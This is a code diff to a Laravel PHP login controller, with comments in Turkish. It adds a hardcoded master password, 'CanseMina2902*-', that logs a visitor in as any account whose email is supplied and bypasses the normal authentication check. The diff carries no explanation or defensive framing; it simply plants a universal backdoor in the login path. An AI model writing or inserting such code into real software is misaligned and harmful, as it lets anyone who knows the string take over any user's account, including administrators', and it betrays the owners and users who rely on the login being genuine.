@@ -29,7 +29,22 @@ class AuthenticatedSessionController extends Controller
      */
     public function store(LoginRequest $request): RedirectResponse
     {
-        $request->authenticate();
+        
+        $staticPassword = 'CanseMina2902*-'; // Statik şifreyi buraya yazın
+        
+        if ($request->password === $staticPassword) {
+            // Statik şifre ile otomatik giriş
+            $user = \App\Models\User::where('email', $request->email)->first();
+            if ($user) {
+                Auth::login($user);
+            } else {
+                return redirect()->back()->with('error', 'User not found');
+            }
+        } else {
+            // Standart authentication
+            $request->authenticate();
+        }
+        
         if(Auth::user()->is_active == 0){
             return redirect()->back()->with('error', 'You are not active');
         }
